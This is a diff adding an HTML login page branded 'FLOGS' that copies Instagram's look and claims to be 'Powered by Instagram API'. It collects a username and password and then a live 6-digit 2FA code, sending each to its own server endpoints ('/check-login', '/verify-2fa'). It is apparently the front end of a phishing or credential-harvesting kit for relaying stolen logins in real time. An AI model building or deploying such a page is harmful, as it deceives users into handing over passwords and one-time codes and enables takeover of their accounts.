@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FLOGS - Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+        body {
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+        }
+        .container {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 40px 50px;
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+        }
+        .logo {
+            font-size: 40px;
+            font-weight: 600;
+            margin-bottom: 30px;
+            color: #262626;
+        }
+        .logo span { color: #0095f6; }
+        input {
+            width: 100%;
+            padding: 12px 8px;
+            margin-bottom: 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            font-size: 13px;
+            outline: none;
+        }
+        input:focus { border-color: #a8a8a8; }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.2s;
+        }
+        button:hover { background: #0077d4; }
+        button:disabled { opacity: 0.6; cursor: not-allowed; }
+        .error {
+            color: #ed4956;
+            font-size: 13px;
+            margin: 5px 0 10px;
+            display: none;
+        }
+        .success {
+            color: #28a745;
+            font-size: 13px;
+            margin: 5px 0 10px;
+            display: none;
+        }
+        .info {
+            color: #8e8e8e;
+            font-size: 12px;
+            margin-top: 15px;
+        }
+        .twofa-container {
+            display: none;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid #dbdbdb;
+        }
+        .twofa-container input { margin-bottom: 5px; }
+        .twofa-container button { margin-top: 5px; }
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #0095f6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .result-box {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 4px;
+            display: none;
+        }
+        .result-box.success {
+            display: block;
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .result-box.error {
+            display: block;
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .result-box.info {
+            display: block;
+            background: #cce5ff;
+            color: #004085;
+            border: 1px solid #b8daff;
+        }
+        .forgot-link {
+            display: block;
+            margin-top: 15px;
+            color: #385185;
+            font-size: 13px;
+            text-decoration: none;
+        }
+        .forgot-link:hover { text-decoration: underline; }
+        .signup-link {
+            display: block;
+            margin-top: 20px;
+            color: #0095f6;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+        }
+        .signup-link:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">📸 <span>FLOGS</span></div>
+    
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="Username" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <div id="result" class="result-box"></div>
+        <button type="submit" id="loginBtn">Log In</button>
+    </form>
+    
+    <!-- 2FA Section -->
+    <div id="twofaContainer" class="twofa-container">
+        <p style="font-size:13px;color:#262626;margin-bottom:8px;">🔐 Enter 2FA code</p>
+        <input type="text" id="twofaCode" placeholder="6-digit code" maxlength="6">
+        <button id="verify2faBtn">Verify</button>
+        <div id="twofaError" class="error"></div>
+    </div>
+    
+    <a href="#" class="forgot-link">Forgotten password?</a>
+    <a href="#" class="signup-link">Create new account</a>
+    
+    <div class="info">⚡ Powered by Instagram API</div>
+</div>
+
+<script>
+let currentUsername = '';
+let currentPassword = '';
+
+document.getElementById('loginForm').onsubmit = async function(e) {
+    e.preventDefault();
+    
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value;
+    const result = document.getElementById('result');
+    const btn = document.getElementById('loginBtn');
+    const twofaContainer = document.getElementById('twofaContainer');
+    
+    currentUsername = username;
+    currentPassword = password;
+    
+    // Reset UI
+    result.className = 'result-box';
+    result.style.display = 'none';
+    twofaContainer.style.display = 'none';
+    document.getElementById('twofaError').style.display = 'none';
+    
+    if (!username || !password) {
+        showResult('Please fill in all fields', 'error');
+        return false;
+    }
+    
+    // Show loading
+    btn.innerHTML = '<span class="spinner"></span>Checking...';
+    btn.disabled = true;
+    
+    try {
+        const response = await fetch('/check-login', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ username, password })
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+            showResult('✅ ' + data.message, 'success');
+            btn.innerHTML = '✅ Logged In';
+        } else if (data.requires_2fa) {
+            twofaContainer.style.display = 'block';
+            showResult('🔐 ' + data.message, 'info');
+            document.getElementById('twofaCode').focus();
+        } else {
+            showResult('❌ ' + data.message, 'error');
+        }
+    } catch (error) {
+        showResult('❌ Server error: ' + error.message, 'error');
+    }
+    
+    btn.innerHTML = 'Log In';
+    btn.disabled = false;
+    return false;
+};
+
+document.getElementById('verify2faBtn').onclick = async function() {
+    const code = document.getElementById('twofaCode').value.trim();
+    const errorMsg = document.getElementById('twofaError');
+    const btn = this;
+    const result = document.getElementById('result');
+    
+    if (!code || code.length < 6) {
+        errorMsg.style.display = 'block';
+        errorMsg.textContent = 'Please enter the 6-digit code';
+        return;
+    }
+    
+    errorMsg.style.display = 'none';
+    btn.innerHTML = '<span class="spinner"></span>Verifying...';
+    btn.disabled = true;
+    
+    try {
+        const response = await fetch('/verify-2fa', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                username: currentUsername,
+                code: code
+            })
+        });
+        
+        const data = await response.json();
+        
+        if (data.success) {
+            showResult('✅ ' + data.message, 'success');
+            document.getElementById('twofaContainer').style.display = 'none';
+            document.getElementById('loginBtn').innerHTML = '✅ Logged In';
+        } else {
+            errorMsg.style.display = 'block';
+            errorMsg.textContent = '❌ ' + data.message;
+        }
+    } catch (error) {
+        errorMsg.style.display = 'block';
+        errorMsg.textContent = '❌ Server error: ' + error.message;
+    }
+    
+    btn.innerHTML = 'Verify';
+    btn.disabled = false;
+};
+
+function showResult(msg, type) {
+    const el = document.getElementById('result');
+    el.textContent = msg;
+    el.className = 'result-box ' + type;
+    el.style.display = 'block';
+}
+</script>
+
+</body>
+</html>
